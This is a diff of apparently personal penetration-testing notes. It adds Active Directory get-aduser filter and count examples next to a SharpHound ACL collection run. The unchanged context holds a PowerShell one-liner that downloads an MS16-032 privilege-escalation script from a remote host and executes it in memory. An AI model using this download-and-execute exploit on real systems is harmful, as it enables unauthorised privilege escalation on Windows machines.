@@ -1,4 +1,4 @@
-#powershell bloodhound sharphound neo4j
+#powershell bloodhound sharphound neo4j get-aduser active directory count
 
 PS C:\Users\USERID\Desktop> .\SharpHound.exe -c ACL -d DOMAIN.NET --SecureLdap --StatusInterval 20000
 Initializing BloodHound at 9:39 PM on 11/8/2017
@@ -24,3 +24,9 @@ Above LDAP:389 connection is encrypted by default in SharpHound, according to bl
 
 #powershell invocation of MS16-032 (non-interactive version of the exploit):
 PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.65/Invoke-MS16032.ps1')
+
+
+#filtering and get-aduser
+get-aduser -filter {(FIELD1 -Like "something") [-or|-and] (FIELD2 -Like "something")}
+#count of the whole lot. 
+(get-aduser -filter {(FIELD1 -Like "something") [-or|-and] (FIELD2 -Like "something")}).count
